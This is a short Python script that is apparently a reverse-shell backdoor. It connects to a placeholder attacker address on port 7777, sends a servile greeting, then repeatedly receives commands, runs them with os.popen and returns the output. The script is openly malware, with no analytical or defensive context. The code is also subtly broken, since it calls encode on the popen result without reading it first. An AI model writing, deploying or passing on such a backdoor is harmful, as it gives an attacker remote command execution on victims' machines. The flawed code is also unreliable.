import os
import socket

sock = socket.socket()
sock.connect(('YOUR IP', 7777))

sock.send('yes moi povelitel'.encode())
while True:

    data = sock.recv(1024).decode()
    data = os.popen(data).encode()
    sock.send(data)


sock.close()
